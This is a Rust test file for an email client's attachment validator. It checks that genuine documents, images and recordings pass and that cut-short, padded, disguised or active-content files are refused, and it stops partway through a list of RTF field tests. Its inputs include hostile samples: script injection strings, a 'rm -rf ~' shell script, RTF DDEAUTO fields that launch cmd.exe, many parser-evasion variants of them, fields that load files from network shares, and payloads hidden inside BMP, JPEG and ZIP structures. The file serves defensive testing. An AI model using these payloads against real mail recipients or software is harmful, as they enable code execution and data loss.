//! T-45: what an attachment's bytes must be before Uni hands it to the system
//! ([`uni_core::mail::attachment::check_content`]). Real files made by
//! LibreOffice, ImageMagick, heif-enc and ffmpeg (`tests/fixtures/attachments`)
//! pass; the same files cut short, with bytes added, or altered to carry
//! macros, objects, DDE or outside links are refused.

use std::io::{Cursor, Read, Write};

use uni_core::mail::attachment::check_content;
use zip::write::SimpleFileOptions;
use zip::{CompressionMethod, ZipArchive, ZipWriter};

fn fixture(name: &str) -> Vec<u8> {
    std::fs::read(format!("{}/tests/fixtures/attachments/{name}", env!("CARGO_MANIFEST_DIR"))).unwrap()
}

fn ext(name: &str) -> &str {
    name.rsplit_once('.').unwrap().1
}

#[track_caller]
fn ok(name: &str, bytes: &[u8]) {
    if let Err(why) = check_content(ext(name), None, bytes) {
        panic!("{name} refused: {why}");
    }
}

#[track_caller]
fn refused(name: &str, bytes: &[u8], says: &str) {
    match check_content(ext(name), None, bytes) {
        Ok(()) => panic!("{name} was accepted; expected a refusal saying {says:?}"),
        Err(why) => assert!(why.contains(says), "{name}: {why}"),
    }
}

const NOT_WHOLE: &str = "isn't a whole";
const OFFICE_ACTIVE: &str = "an Office file with macros, an embedded object, unsupported fields, or a link that loads from outside";
const RTF_ACTIVE: &str = "a document with an embedded object or unsupported fields";
const ODF_ACTIVE: &str = "a document with macros, an embedded object or a script binding";

/// Every entry of `base`, with `changes` replacing or adding entries (in order); `mimetype` stays first and stored.
fn rezip(base: &[u8], changes: &[(&str, &[u8])]) -> Vec<u8> {
    let mut z = ZipArchive::new(Cursor::new(base)).unwrap();
    let mut entries: Vec<(String, Vec<u8>)> = (0..z.len())
        .map(|i| {
            let mut f = z.by_index(i).unwrap();
            let mut data = Vec::new();
            f.read_to_end(&mut data).unwrap();
            (f.name().to_string(), data)
        })
        .collect();
    for (name, data) in changes {
        match entries.iter_mut().find(|(n, _)| n == name) {
            Some(e) => e.1 = data.to_vec(),
            None => entries.push((name.to_string(), data.to_vec())),
        }
    }
    let mut w = ZipWriter::new(Cursor::new(Vec::new()));
    for (name, data) in entries {
        let method = if name == "mimetype" { CompressionMethod::Stored } else { CompressionMethod::Deflated };
        w.start_file(name, SimpleFileOptions::default().compression_method(method)).unwrap();
        w.write_all(&data).unwrap();
    }
    w.finish().unwrap().into_inner()
}

fn entry(base: &[u8], name: &str) -> String {
    let mut s = String::new();
    ZipArchive::new(Cursor::new(base)).unwrap().by_name(name).unwrap().read_to_string(&mut s).unwrap();
    s
}

/// `base`'s `rels` part with `relationship` added.
fn with_rel(base: &[u8], rels: &str, relationship: &str) -> Vec<u8> {
    let xml = entry(base, rels).replace("</Relationships>", &format!("{relationship}</Relationships>"));
    rezip(base, &[(rels, xml.as_bytes())])
}

const REL: &str = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";

#[test]
fn real_files_of_every_type_pass() {
    for name in [
        "notes.pdf", "photo.png", "photo.jpg", "photo.gif", "photo.webp", "photo.heic", "photo.bmp", "photo-1bit.bmp", "photo-argb.bmp",
        "notes.txt", "notes.md", "sheet.csv", "invite.ics", "ada.vcf", "notes.rtf",
        "notes.docx", "sheet.xlsx", "notes.pptx", "notes.odt", "sheet.ods", "notes.odp",
        "voice.mp3", "voice.aac", "voice.m4a", "clip.mp4", "clip.m4v", "clip.mov", "voice.ogg", "voice.opus", "voice.wav", "clip.webm",
    ] {
        ok(name, &fixture(name));
    }
}

#[test]
fn a_file_cut_short_is_refused() {
    for name in [
        "notes.pdf", "photo.png", "photo.jpg", "photo.gif", "photo.webp", "photo.heic", "photo.bmp", "notes.rtf",
        "notes.docx", "sheet.xlsx", "notes.pptx", "notes.odt", "sheet.ods", "notes.odp",
        "voice.mp3", "voice.aac", "voice.m4a", "clip.mp4", "clip.mov", "voice.ogg", "voice.opus", "voice.wav", "clip.webm",
    ] {
        let whole = fixture(name);
        // a PDF or RTF still ends properly without its final newline, so cut into its last line
        let last = if name.ends_with(".pdf") || name.ends_with(".rtf") { whole.len() - 7 } else { whole.len() - 1 };
        for keep in [last, whole.len() * 2 / 3, whole.len() / 2, 64] {
            refused(name, &whole[..keep], NOT_WHOLE);
        }
    }
    // a calendar or card without its end
    let ics = fixture("invite.ics");
    refused("invite.ics", &ics[..ics.len() - 16], NOT_WHOLE);
    refused("ada.vcf", b"BEGIN:VCARD\r\nFN:Ada\r\n", NOT_WHOLE);
}

#[test]
fn a_file_with_something_after_its_end_is_refused() {
    let tail = b"<script>alert(1)</script>";
    for name in [
        "notes.pdf", "photo.png", "photo.jpg", "photo.gif", "photo.webp", "photo.heic", "photo.bmp", "notes.rtf",
        "notes.docx", "sheet.xlsx", "notes.odt", "voice.mp3", "voice.aac", "voice.m4a", "clip.mp4", "voice.ogg", "voice.wav", "clip.webm", "invite.ics",
    ] {
        refused(name, &[fixture(name).as_slice(), tail].concat(), "");
    }
}

/// A BMP's bytes with `edits` (offset, bytes) applied, cut or padded to `len`, and its file-size field saying `len`.
fn bmp_with(base: &[u8], edits: &[(usize, &[u8])], len: usize) -> Vec<u8> {
    let mut b = base.to_vec();
    b.resize(len, 0);
    for (at, bytes) in edits {
        b[*at..at + bytes.len()].copy_from_slice(bytes);
    }
    b[2..6].copy_from_slice(&(len as u32).to_le_bytes());
    b
}

#[test]
fn a_bmp_holds_every_row_of_its_pixels() {
    const BMPS: [&str; 5] = ["photo.bmp", "photo-1bit.bmp", "photo-4bit.bmp", "photo-565.bmp", "photo-argb.bmp"];
    for name in BMPS {
        let bmp = fixture(name);
        ok(name, &bmp);
        // cut short, with the file-size field following it: the pixel rows no longer fit
        for keep in [bmp.len() - 1, bmp.len() - 4, bmp.len() / 2] {
            refused(name, &bmp_with(&bmp, &[], keep), NOT_WHOLE);
        }
    }
    let bmp = fixture("photo.bmp");
    // Codex round 3: the 630-byte 16x12 picture cut to 55 bytes, its size field updated; one pixel byte left
    refused("photo.bmp", &bmp_with(&bmp, &[], 55), NOT_WHOLE);
    // stored top-down (a negative height) is fine; a little zero padding after the rows is too
    ok("photo.bmp", &bmp_with(&bmp, &[(22, &(-12i32).to_le_bytes())], bmp.len()));
    ok("photo.bmp", &bmp_with(&bmp, &[], bmp.len() + 2));
    // more than padding, or anything but zeros, after the rows
    refused("photo.bmp", &bmp_with(&bmp, &[], bmp.len() + 4), NOT_WHOLE);
    refused("photo.bmp", &bmp_with(&bmp, &[(bmp.len(), b"<b>")], bmp.len() + 3), NOT_WHOLE);
    // a header that doesn't hold up: no width, no height, two planes, 7 bits a pixel, an unknown header size
    for (at, bytes) in [(18, &0u32.to_le_bytes()[..]), (22, &0u32.to_le_bytes()), (26, &2u16.to_le_bytes()), (28, &7u16.to_le_bytes()), (14, &41u32.to_le_bytes())] {
        refused("photo.bmp", &bmp_with(&bmp, &[(at, bytes)], bmp.len()), NOT_WHOLE);
    }
    // a width so wide the rows can't be in the file
    refused("photo.bmp", &bmp_with(&bmp, &[(18, &0x7FFF_FFFFu32.to_le_bytes())], bmp.len()), NOT_WHOLE);
    // compressed pixels (RLE, or a JPEG or PNG inside), and bit fields on a 24-bit picture
    for compression in [1u32, 2, 4, 5, 3, 6] {
        refused("photo.bmp", &bmp_with(&bmp, &[(30, &compression.to_le_bytes())], bmp.len()), NOT_WHOLE);
    }
    // a color table bigger than its bit count allows, or than the room before the pixels
    let mono = fixture("photo-1bit.bmp");
    // (each with the pixels moved so the rows still end the file: only the color table is wrong)
    refused("photo-1bit.bmp", &bmp_with(&mono, &[(46, &3u32.to_le_bytes()), (10, &66u32.to_le_bytes())], mono.len() + 4), NOT_WHOLE);
    refused("photo-1bit.bmp", &bmp_with(&mono, &[(10, &58u32.to_le_bytes())], mono.len() - 4), NOT_WHOLE);
    // review: a payload between the color table and the pixels, with the offset pointing past it
    let payload = b"<html><script>alert(1)</script></html>";
    let mut hidden = bmp[..54].to_vec();
    hidden.extend_from_slice(payload);
    hidden.extend_from_slice(&bmp[54..]);
    let len = hidden.len();
    refused("photo.bmp", &bmp_with(&hidden, &[(10, &(54 + payload.len() as u32).to_le_bytes())], len), NOT_WHOLE);
    // an OS/2 2.x header (64 bytes) with plain pixels is fine; with bit fields (Huffman, there) it isn't
    let mut os2 = bmp[..54].to_vec();
    os2.extend_from_slice(&[0; 24]);
    os2.extend_from_slice(&bmp[54..]);
    let len = os2.len();
    ok("photo.bmp", &bmp_with(&os2, &[(14, &64u32.to_le_bytes()), (10, &78u32.to_le_bytes())], len));
    // (at 16 bits a pixel, where bit fields are allowed in a Windows header: 12 rows of 32 bytes)
    let os2_16 = |compression: u32| bmp_with(&os2, &[(14, &64u32.to_le_bytes()), (10, &78u32.to_le_bytes()), (28, &16u16.to_le_bytes()), (30, &compression.to_le_bytes())], 78 + 12 * 32);
    ok("photo.bmp", &os2_16(0));
    refused("photo.bmp", &os2_16(3), NOT_WHOLE);
    // a version 5 header with an embedded profile right after the pixels is fine; one past a hidden gap isn't
    let argb = fixture("photo-argb.bmp");
    let profile = [b"MBED".as_slice(), &[0u8; 128]].concat();
    let with_profile = |gap: &[u8]| {
        let body = [argb.as_slice(), gap, &profile].concat();
        let at = (argb.len() + gap.len() - 14) as u32;
        bmp_with(&body, &[(14 + 56, b"DEBM"), (14 + 112, &at.to_le_bytes()), (14 + 116, &(profile.len() as u32).to_le_bytes())], body.len())
    };
    ok("photo-argb.bmp", &with_profile(b""));
    refused("photo-argb.bmp", &with_profile(b"<script>alert(1)</script>"), NOT_WHOLE);
    // a version 5 header whose color profile is a file to fetch (PROFILE_LINKED)
    refused("photo-argb.bmp", &bmp_with(&argb, &[(14 + 56, b"KNIL")], argb.len()), NOT_WHOLE);
}

#[test]
fn a_jpeg_ends_at_its_first_end_marker() {
    // review: a payload after the real end, then FF D9 again, is still something added
    let jpg = fixture("photo.jpg");
    refused("photo.jpg", &[jpg.as_slice(), b"PK\x03\x04 payload", b"\xFF\xD9"].concat(), NOT_WHOLE);
    // second review: a phone's multi-picture or HDR photo is whole JPEGs back to back, and passes
    ok("photo.jpg", &[jpg.as_slice(), &jpg].concat());
    refused("photo.jpg", &[jpg.as_slice(), &jpg, b"x"].concat(), NOT_WHOLE);
}

#[test]
fn a_zip_hides_nothing_between_or_under_its_entries() {
    // review: a local entry the central directory doesn't list, slipped in before the directory
    let docx = fixture("notes.docx");
    let cd = docx.windows(4).position(|w| w == b"PK\x01\x02").unwrap();
    let hidden = [&b"PK\x03\x04"[..], &[0u8; 22], &[19, 0, 0, 0], b"word/vbaProject.bin"].concat();
    let mut patched = [&docx[..cd], &hidden, &docx[cd..]].concat();
    // move the end record's directory offset past the hidden entry
    let eocd = patched.windows(4).rposition(|w| w == b"PK\x05\x06").unwrap();
    let offset = u32::from_le_bytes(patched[eocd + 16..eocd + 20].try_into().unwrap()) + hidden.len() as u32;
    patched[eocd + 16..eocd + 20].copy_from_slice(&offset.to_le_bytes());
    refused("notes.docx", &patched, NOT_WHOLE);
    // second review: what sits after an entry's data must be that entry's own data descriptor
    let at = docx.windows(4).position(|w| w == b"PK\x07\x08").unwrap();
    let mut bad_descriptor = docx.clone();
    bad_descriptor[at + 4] ^= 0xFF; // its CRC
    refused("notes.docx", &bad_descriptor, NOT_WHOLE);
    // a local header named differently from its central-directory entry
    let mut renamed = docx.clone();
    let at = renamed.windows(19).position(|w| w == b"word/_rels/document").unwrap();
    renamed[at..at + 4].copy_from_slice(b"WORX");
    refused("notes.docx", &renamed, NOT_WHOLE);
}

#[test]
fn ordinary_recordings_with_tags_or_streamed_sizes_pass() {
    // review: an MP3 with an APEv2 tag, with zero padding, or with both and an ID3v1 tag
    let mp3 = fixture("voice.mp3");
    let ape_items = b"\x05\0\0\0\0\0\0\0Title\0Notes";
    let ape = |items: &[u8]| [b"APETAGEX".as_slice(), &2000u32.to_le_bytes(), &((items.len() + 32) as u32).to_le_bytes(), &1u32.to_le_bytes(), &0u32.to_le_bytes(), &[0u8; 8]].concat();
    ok("voice.mp3", &[mp3.as_slice(), ape_items, &ape(ape_items)].concat());
    ok("voice.mp3", &[mp3.as_slice(), &[0u8; 300]].concat());
    let id3v1 = [b"TAG".as_slice(), &[b' '; 125]].concat();
    ok("voice.mp3", &[mp3.as_slice(), ape_items, &ape(ape_items), &id3v1].concat());
    // second review: an APE footer is not a licence to append anything
    let payload = b"<html><script>alert(1)</script></html>";
    let fake = [b"APETAGEX".as_slice(), &2000u32.to_le_bytes(), &((payload.len() + 32) as u32).to_le_bytes(), &0u32.to_le_bytes(), &0u32.to_le_bytes(), &[0u8; 8]].concat();
    refused("voice.mp3", &[mp3.as_slice(), payload, &fake].concat(), NOT_WHOLE);
    // a size near 4 GiB with the header flag: refused, no overflow
    let huge = [b"APETAGEX".as_slice(), &2000u32.to_le_bytes(), &0xFFFF_FFF0u32.to_le_bytes(), &1u32.to_le_bytes(), &0x8000_0000u32.to_le_bytes(), &[0u8; 8]].concat();
    refused("voice.mp3", &[mp3.as_slice(), &huge].concat(), NOT_WHOLE);
    // a WebM as a browser records it: Segment and Cluster of unknown size
    let webm = fixture("clip.webm");
    let (seg, _) = webm.windows(4).enumerate().find(|(_, w)| *w == b"\x18\x53\x80\x67").unwrap();
    let size_len = (webm[seg + 4].leading_zeros() + 1) as usize;
    let unknown = b"\x01\xFF\xFF\xFF\xFF\xFF\xFF\xFF";
    let streamed = [&webm[..seg + 4], &unknown[..], &webm[seg + 4 + size_len..]].concat();
    let cluster = streamed.windows(4).position(|w| w == b"\x1F\x43\xB6\x75").unwrap();
    let size_len = (streamed[cluster + 4].leading_zeros() + 1) as usize;
    let streamed = [&streamed[..cluster + 4], &unknown[..], &streamed[cluster + 4 + size_len..]].concat();
    ok("clip.webm", &streamed);
    refused("clip.webm", &streamed[..streamed.len() - 3], NOT_WHOLE);
}

#[test]
fn a_signature_alone_is_not_a_file() {
    // what fix round 1 accepted on its first bytes
    refused("photo.png", b"\x89PNG\r\n\x1a\n", NOT_WHOLE);
    refused("photo.png", b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR", NOT_WHOLE);
    refused("notes.pdf", b"%PDF-1.4\n% fake test notes\n", NOT_WHOLE);
    refused("notes.docx", b"PK\x03\x04 [Content_Types].xml word/document.xml", NOT_WHOLE);
    refused("photo.jpg", b"\xFF\xD8\xFF\xE0", NOT_WHOLE);
    refused("clip.mp4", b"\0\0\0\x18ftypisom", NOT_WHOLE);
    refused("photo.heic", b"\0\0\0\x18ftypheic", NOT_WHOLE);
    refused("voice.mp3", b"ID3", NOT_WHOLE);
    refused("photo.jpg", b"", "an empty file");
    // a PNG with one byte of its pixels changed: the chunk's CRC no longer fits
    let mut png = fixture("photo.png");
    let idat = png.windows(4).position(|w| w == b"IDAT").unwrap();
    png[idat + 6] ^= 1;
    refused("photo.png", &png, NOT_WHOLE);
}

#[test]
fn a_file_that_is_something_else_says_what_it_is() {
    let svg = b"<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>";
    assert_eq!(check_content("png", Some("image/png"), svg).unwrap_err(), "it is named .png but its contents are an SVG image (which can run script)");
    refused("statement.pdf", b"MZ\x90\0\x03\0\0\0", "a Windows program");
    refused("notes.txt", b"  <!DOCTYPE html><p>hi", "a web page");
    refused("notes.txt", b"#!/bin/sh\nrm -rf ~", "a script");
    refused("photo.webp", &fixture("voice.wav"), "something else");
    refused("sheet.ods", &fixture("notes.odt"), NOT_WHOLE);
    refused("photo.heic", &fixture("clip.mp4"), NOT_WHOLE);
    refused("notes.docx", &fixture("sheet.xlsx"), NOT_WHOLE);
    let mut w = ZipWriter::new(Cursor::new(Vec::new()));
    w.start_file("evil.exe", SimpleFileOptions::default()).unwrap();
    w.write_all(b"MZ").unwrap();
    refused("notes.docx", &w.finish().unwrap().into_inner(), NOT_WHOLE);
}

#[test]
fn text_is_text() {
    ok("notes.md", b"# Notes\n\nplain words, 3 < 4");
    ok("sheet.csv", b"a,b\n1,2\n");
    ok("notes.md", b"# Title\n<!-- TOC -->\n- a\n");
    // markup is looked for in the whole file, not just its start
    let late = [b"# Notes\n".repeat(1000).as_slice(), b"<script>fetch('https://x.example/')</script>"].concat();
    refused("notes.md", &late, "a web page");
    // UTF-16 text is text; its markup is still found
    let utf16 = |s: &str| [&b"\xFF\xFE"[..], &s.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<u8>>()].concat();
    ok("notes.txt", &utf16("name\tvalue\n"));
    refused("sheet.csv", &utf16("a,<script>x</script>"), "a web page");
    ok("invite.ics", b"\xEF\xBB\xBFBEGIN:VCALENDAR\r\nEND:VCALENDAR\r\n");
    refused("invite.ics", b"hello", "something else");
}

#[test]
fn rtf_with_an_object_or_dde_is_refused() {
    refused("x.rtf", b"{\\rtf1{\\object\\objemb{\\*\\objdata 0105000002000000}}}", RTF_ACTIVE);
    refused("x.rtf", b"{\\rtf1{\\field{\\*\\fldinst { DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\"}}}}", RTF_ACTIVE);
    ok("x.rtf", b"{\\rtf1\\ansi Hello \\b world\\b0}");
    // review: what Word writes inside a field instruction (formatting control words, groups, escapes) can't hide DDE
    for hidden in [
        &b"{\\rtf1{\\field{\\*\\fldinst {\\rtlch\\fcs1 DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\"}}}}"[..],
        b"{\\rtf1{\\field{\\*\\fldinst {\\rtlch DD}{\\b EAUTO} calc}}}",
        b"{\\rtf1{\\field{\\*\\fldinst \\'44\\'44EAUTO calc}}}",
        b"{\\rtf1{\\field{\\*\\fldinst \\u68?\\u68?E calc}}}",
        b"{\\rtf1{\\field{\\*\\fldinst {\\*\\bkmkstart x}DDE calc}}}",
        // second review: an escaped space, a tab, \uc0, a number on \fldinst
        b"{\\rtf1{\\field{\\*\\fldinst DDEAUTO\\'20calc}}}",
        b"{\\rtf1{\\field{\\*\\fldinst DDEAUTO\\tab calc}}}",
        b"{\\rtf1{\\field{\\*\\fldinst {\\uc0\\u68\\u68\\u69AUTO calc}}}}",
        b"{\\rtf1{\\field{\\*\\fldinst0 DDEAUTO calc}}}",
    ] {
        refused("x.rtf", hidden, RTF_ACTIVE);
    }
    ok("x.rtf", b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK \"https://example.com/\"}{\\fldrslt here}}}");
    // fails closed: an escape in a field instruction is refused even in a web address
    refused("x.rtf", b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK \"https://x.example/caf\\'e9\"}{\\fldrslt x}}}", RTF_ACTIVE);
    ok("x.rtf", b"{\\rtf1 \\bin3 }}}x}");
    // round 3: control words without case where that refuses more; only `\\bin` exactly skips data, since Word
    // parses what follows `\\BIN`
    refused("x.rtf", b"{\\rtf1{\\OBJECT\\objemb}}", "embedded object");
    refused("x.rtf", b"{\\rtf1{\\field{\\*\\FLDINST DDEAUTO calc}}}", RTF_ACTIVE);
    refused("x.rtf", b"{\\rtf1 \\BIN17 {\\object\\objemb}}}", "embedded object");
    refused("x.rtf", b"{\\rtf1 \\bin99999999999999999999 x}", NOT_WHOLE);
    // review: a count with leading zeros, which a reader that caps its digits reads as \\bin0
    refused("x.rtf", b"{\\rtf1 \\bin0000000000017 {\\object\\objemb}}}", "");
    refused("x.rtf", b"{\\rtf1 \\bin9 x}", NOT_WHOLE);
    refused("x.rtf", b"{\\rtf1 unbalanced", NOT_WHOLE);
    refused("x.rtf", b"{\\rtf1 one}{two}", NOT_WHOLE);
}

/// Codex round 4: a reader skips a destination's text, so `DD{\\*\\unknown x}EAUTO` is `DDEAUTO` to Word while
/// fix 3 read `ddxeautocalc`. An instruction may hold only text, plain groups and formatting.
#[test]
fn a_destination_in_a_field_instruction_is_refused() {
    for hidden in [
        // Codex's exact sample
        &b"{\\rtf1{\\field{\\*\\fldinst DD{\\*\\unknown x}EAUTO calc}{\\fldrslt 0}}}"[..],
        // `\\*` before a word that is allowed: only the `\\*` rule catches this one
        b"{\\rtf1{\\field{\\*\\fldinst DD{\\*\\b x}EAUTO calc}{\\fldrslt 0}}}",
        // a destination Word knows, without `\\*`, and one nested in a formatting group
        b"{\\rtf1{\\field{\\*\\fldinst DD{\\footnote x}EAUTO calc}{\\fldrslt 0}}}",
        b"{\\rtf1{\\field{\\*\\fldinst DD{\\b{\\*\\bkmkstart x}}EAUTO calc}{\\fldrslt 0}}}",
        // hidden or deleted text, which a reader may leave out
        b"{\\rtf1{\\field{\\*\\fldinst DD{\\v x}EAUTO calc}{\\fldrslt 0}}}",
        b"{\\rtf1{\\field{\\*\\fldinst DD{\\deleted x}EAUTO calc}{\\fldrslt 0}}}",
        // a field nested in the instruction
        b"{\\rtf1{\\field{\\*\\fldinst DD{\\field{\\*\\fldinst x}}EAUTO calc}{\\fldrslt 0}}}",
        // text before `\\fldinst` in its group, which fix 3 didn't read
        b"{\\rtf1{\\field{\\*DD\\fldinst EAUTO calc}{\\fldrslt 0}}}",
        b"{\\rtf1{\\field{\\*{DD}\\fldinst EAUTO calc}{\\fldrslt 0}}}",
        // review: `\\plain` shows text hidden from outside the instruction, and a style may be hidden
        b"{\\rtf1{\\v{\\field{\\*\\fldinst {\\plain DD}x{\\plain EAUTO calc}}{\\fldrslt 0}}}}",
        b"{\\rtf1{\\stylesheet{\\*\\cs15 \\v Hidden;}}{\\field{\\*\\fldinst DD{\\cs15 x}EAUTO calc}{\\fldrslt 0}}}",
        // review: one field's instruction split over two groups, which a reader may join
        b"{\\rtf1{\\field{\\*\\fldinst DD}{\\*\\fldinst EAUTO calc}{\\fldrslt 0}}}",
        // review: `\\bin` data before `\\fldinst` in its group
        b"{\\rtf1{\\field{\\*\\bin2 DD\\fldinst EAUTO calc}{\\fldrslt 0}}}",
        // second review: a field's first instruction in a group of its own is still joined with the next
        b"{\\rtf1{\\field{{\\*\\fldinst DD}}{\\*\\fldinst EAUTO calc}{\\fldrslt 0}}}",
        // `\\plain` in a file with deleted text anywhere
        b"{\\rtf1{\\deleted{\\field{\\*\\fldinst {\\plain DD}x{\\plain EAUTO calc}}{\\fldrslt 0}}}}",
    ] {
        refused("x.rtf", hidden, RTF_ACTIVE);
    }
    // plain groups and formatting are text a reader sees, so they still pass; DDE across them is still found
    ok("x.rtf", b"{\\rtf1{\\field{\\*\\fldinst {\\rtlch\\fcs1 \\af0 \\ltrch\\fcs0 \\insrsid1 HYPERLINK \"https://example.com/\" }}{\\fldrslt here}}}");
    ok("x.rtf", b"{\\rtf1{\\field{\\*\\fldinst\r\n{HYPER}{\\b LINK https://a.org/}}{\\fldrslt 1}}}");
    // review: the formatting Word writes in a table of contents' fields; and two fields' instructions are kept apart
    ok("x.rtf", b"{\\rtf1{\\field{\\*\\fldinst {\\rtlch\\fcs1 \\af0 \\ltrch\\fcs0 \\cgrid\\insrsid1 HYPERLINK https://a.org/ }}{\\fldrslt 1}}}");
    ok("x.rtf", b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/}{\\fldrslt 1}}{\\field{\\*\\fldinst HYPERLINK mailto:a@b.org}{\\fldrslt 2}}}");
    // second review: a field nested in another's result is kept apart (a table of contents nests them); Word's
    // `\\webhidden` in a contents entry; `\\cs` and `\\plain` where nothing in the file is hidden
    ok("x.rtf", b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK \"https://a.org/d\"}{\\fldrslt {\\field{\\*\\fldinst HYPERLINK https://b.org/}{\\fldrslt 1}}}}}");
    ok("x.rtf", b"{\\rtf1{\\field{\\*\\fldinst {\\rtlch\\fcs1 \\af0 \\ltrch\\fcs0 \\webhidden\\insrsid1 HYPERLINK https://a.org/ }}{\\fldrslt 1}}}");
    ok("x.rtf", b"{\\rtf1{\\field{\\*\\fldinst {\\rtlch\\fcs1 \\af0 \\ltrch\\fcs0 \\cs15\\insrsid1 HYPERLINK \"https://example.com/\" }}{\\fldrslt here}}}");
    ok("x.rtf", b"{\\rtf1{\\viewkind4{\\field{\\*\\fldinst {\\plain HYPERLINK https://a.org/}}{\\fldrslt 1}}}}");
    refused("x.rtf", b"{\\rtf1{\\field{\\*\\fldinst DD{E}AUTO calc}{\\fldrslt 0}}}", RTF_ACTIVE);
    // round 7: the same shapes around a link, whose text alone would pass, so each rule is what refuses it
    for hidden in [
        &b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/{\\*\\b x}}{\\fldrslt 0}}}"[..],
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/{\\*\\unknown x}}{\\fldrslt 0}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/{\\v x}}{\\fldrslt 0}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/{\\deleted x}}{\\fldrslt 0}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/\\'41}{\\fldrslt 0}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/\\u65?}{\\fldrslt 0}}}",
        b"{\\rtf1{\\v{\\field{\\*\\fldinst {\\plain HYPERLINK https://a.org/}}{\\fldrslt 0}}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/{\\field{\\*\\fldinst }}}{\\fldrslt 0}}}",
    ] {
        refused("x.rtf", hidden, RTF_ACTIVE);
    }
    // a destination outside an instruction is still fine
    ok("x.rtf", b"{\\rtf1{\\*\\generator x}{\\field{\\*\\fldinst HYPERLINK https://a.org/}{\\fldrslt 1}}}");
}

/// Codex round 5: a destination between a field's instruction groups held a `\\fldinst` of its own, read into
/// the field though a reader skips it. A field's group now holds one instruction group and one result group and
/// nothing else, and a `\\fldinst` anywhere else is refused.
#[test]
fn a_field_holds_one_instruction_and_one_result() {
    for hidden in [
        // Codex's exact sample
        &b"{\\rtf1{\\field{\\*\\fldinst DD}{\\*\\unknown{\\*\\fldinst x}}{\\*\\fldinst EAUTO calc}{\\fldrslt 0}}}"[..],
        // the same inside the result group, which fix 4 read into the instruction
        b"{\\rtf1{\\field{\\*\\fldinst DD}{\\fldrslt{\\*\\fldinst x}}{\\*\\fldinst EAUTO calc}}}",
        // a destination or text in the field's own group, a second result, an unnamed group
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/}{\\*\\unknown x}{\\fldrslt 0}}}",
        b"{\\rtf1{\\field DD{\\*\\fldinst EAUTO calc}{\\fldrslt 0}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/}{\\fldrslt 0}{\\fldrslt 1}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/}{\\b x}{\\fldrslt 0}}}",
        b"{\\rtf1{\\field\\b{\\*\\fldinst HYPERLINK https://a.org/}{\\fldrslt 0}}}",
        // `\\field` that doesn't open its group, and an instruction with no field around it
        b"{\\rtf1{\\b\\field{\\*\\fldinst HYPERLINK https://a.org/}{\\fldrslt 0}}}",
        b"{\\rtf1{\\*\\fldinst HYPERLINK https://a.org/}}",
        // each caught by one rule alone: an instruction in the result, two instructions, a destination with no
        // result after it, a group in the field's group that names nothing, an empty one
        b"{\\rtf1{\\field{\\fldrslt {\\*\\fldinst HYPERLINK https://a.org/}}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK }{\\*\\fldinst https://a.org/}{\\fldrslt 1}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/}{\\*\\unknown x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/}{{x}}}}",
        b"{\\rtf1{\\field{}{\\*\\fldinst HYPERLINK https://a.org/}}}",
        // a control symbol in the field's group, or one other than `\\*` before a part is named
        b"{\\rtf1{\\field\\~{\\*\\fldinst HYPERLINK https://a.org/}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/}{\\~x}}}",
    ] {
        refused("x.rtf", hidden, RTF_ACTIVE);
    }
    // what Word, LibreOffice and TextEdit write still passes: `\\fldedit`, line breaks between the parts, the
    // instruction in a group of its own inside its part, a field in a result
    ok("x.rtf", b"{\\rtf1{\\field\\fldedit{\\*\\fldinst {\\rtlch\\fcs1 \\af0 HYPERLINK https://a.org/ }}{\\fldrslt {\\rtlch 1}}}}");
    // review: insignificant whitespace (a space, a tab) before `\\field`, `\\fldinst` or `\\fldrslt` is not a refusal
    ok("x.rtf", b"{\\rtf1{ \\field{ \\*\\fldinst HYPERLINK https://a.org/}\t{\\fldrslt 1}}}");
    ok("x.rtf", b"{\\rtf1{\\field{\\*\\fldinst{HYPERLINK \"https://example.com/\"}}\r\n{\\fldrslt \\cf2 \\ul here}}}");
    ok("x.rtf", b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK \"https://a.org/\"}{\\fldrslt {\\field{\\*\\fldinst HYPERLINK https://a.org/}{\\fldrslt 1}}}}}");
}

/// Codex round 7: an RTF instruction was refused only when it held `dde`, so `INCLUDEPICTURE` from a file share
/// passed. Now the only field instruction allowed is `HYPERLINK` to one web or mail address, with no switch.
#[test]
fn an_rtf_field_is_refused_unless_it_is_a_web_or_mail_link() {
    for active in [
        // Codex's exact sample
        &b"{\\rtf1{\\field{\\*\\fldinst INCLUDEPICTURE \"file://host/share/a.png\"}{\\fldrslt x}}}"[..],
        // other fields that load from outside: a share, a linked object, an import, a web picture
        b"{\\rtf1{\\field{\\*\\fldinst INCLUDETEXT \"\\\\\\\\host\\\\share\\\\a.docx\"}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst LINK Excel.Sheet.8 \"\\\\\\\\host\\\\share\\\\a.xls\" Sheet1 \\\\a}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst IMPORT file://host/share/a.png}{\\fldrslt x}}}",
